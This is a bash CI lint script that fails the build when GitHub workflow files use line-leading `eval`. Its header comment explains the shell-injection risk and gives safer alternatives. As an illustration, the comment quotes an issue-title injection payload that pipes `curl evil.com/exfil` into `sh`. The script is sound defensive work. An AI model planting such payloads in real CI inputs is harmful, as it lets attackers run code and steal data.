#!/usr/bin/env bash
# For every workflow yml across the umbrella, pin that no step
# uses the bash `eval` builtin as the leading command of a
# line.
#
# `eval` re-parses its arguments as a shell command and
# executes them — turning string content into executable code.
# In a CI workflow where step inputs can come from:
#
#   - PR title / body / branch name (attacker-controlled in
#     `pull_request_target` workflows — already gated by iter-93)
#   - Issue comments (attacker-controlled in repository-
#     dispatch workflows)
#   - Workflow inputs (in `workflow_dispatch` runs)
#   - Github contexts (`${{ github.event.X }}`) which the
#     workflow templater inlines into the run: script BEFORE
#     bash sees it
#
# the eval pattern is a shell-injection oracle. An issue title
# like `"; curl evil.com/exfil | sh; #` becomes executable code
# when expanded into an eval call.
#
# Even in "trusted-input" scenarios, eval defeats shellcheck
# static analysis (which can't follow the indirection) and
# bash's set -u (which can't catch unset vars hidden inside
# the eval'd string). The pattern is universally avoidable —
# every legitimate use case has a non-eval alternative:
#
#   Bad:  eval "$cmd $arg"
#   Good: "$cmd" "$arg"        (direct invocation)
#
#   Bad:  eval "export $var=$val"
#   Good: declare -g "$var=$val"   (declare builtin)
#
#   Bad:  eval "$(command --print-env)"
#   Good: command --print-env > /tmp/env.sh; source /tmp/env.sh
#         (auditable: the env content lives in a file you can
#          inspect)
#
# Detection: lines where `eval` is the FIRST non-whitespace
# token. False-positives this avoids:
#
#   - `mongosh --eval '...'`        (flag, not bash builtin)
#   - `cargo eval ...`              (if such a subcommand exists)
#   - `cmd && eval ...`             (intentional — caught only if
#                                    eval is line-leading per
#                                    the regex anchor)
#   - `# eval is dangerous`         (comment, ignored)
#
# Detection refines beyond plain `\beval\b` to the line-leading
# form because that's the actual canonical-shell-eval pattern.
# Mid-line eval inside complex pipelines is rarer and usually
# already broken in other ways (and gets caught by shellcheck).
#
# 90/90 workflow files green at iter-107 add — pure regression
# floor against shell-injection introduction.
set -uo pipefail
root="$(cd "$(dirname "$0")/.." && pwd)"
cd "$root" || exit
ok=1

checked=0
risky=0

while IFS= read -r wf; do
    [[ -f "$wf" ]] || continue
    checked=$((checked + 1))

    while IFS= read -r match; do
        ln_num="${match%%:*}"
        line="${match#*:}"
        stripped=$(echo "$line" | sed -E 's/^[[:space:]]*//')
        # Skip --eval (long-form flag, e.g. mongosh, node, gh).
        if echo "$line" | grep -qE -- '--eval'; then
            continue
        fi
        if echo "$stripped" | grep -qE '^eval[[:space:]]'; then
            echo "FAIL  $wf:$ln_num: line-leading bash \`eval\` — shell-injection oracle. Replace with direct invocation. Line: $line"
            risky=$((risky + 1))
            ok=0
        fi
    done < <(grep -nE '\beval[[:space:]]' "$wf" 2>/dev/null || true)
done < <(find . -path './.git' -prune \
    -o -path '*/grammars/sources/*' -prune \
    -o -path '*/_deps/*' -prune \
    -o -path '*/libs/JUCE/*' -prune \
    -o -path '*/clap-libs/*' -prune \
    -o -path '*/clap-juce-extensions/*' -prune \
    -o -path '*/node_modules/*' -prune \
    -o -path '*/vendor/*' -prune \
    -o -path '*/target/*' -prune \
    -o -path '*/third_party/*' -prune \
    -o -type f -path '*/.github/workflows/*.yml' -print 2>/dev/null)

echo "---"
echo "Summary: $checked workflow files checked, $risky line-leading bash eval uses"

[[ $ok -eq 1 ]] && exit 0 || exit 1
